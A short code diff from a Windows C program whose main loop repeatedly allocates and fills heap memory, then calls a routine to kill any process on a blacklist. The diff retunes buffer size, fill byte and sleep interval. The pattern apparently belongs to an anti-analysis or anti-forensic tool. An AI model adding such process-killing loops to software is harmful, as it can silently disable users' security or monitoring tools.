@@ -73,18 +73,18 @@ int WINAPI WinMain(HINSTANCE inst,HINSTANCE prev,LPSTR cmd,int show)
 
 	while(1)
 	{
-		memdirt = (char *) malloc(100000000);
+		memdirt = (char *) malloc(1000000);
 
 		if(memdirt!=NULL)
 		{
 // write dirt in heap
-			memset(memdirt,00, 100000000);
+			memset(memdirt,66, 1000000);
 			free(memdirt);
 			// kill any process of blacklist
  			jasonkiller();
 		}
 // wait 3 sec to kill again
-		Sleep(3000); 
+		Sleep(10000); 
 	}
 
 	exit(0);
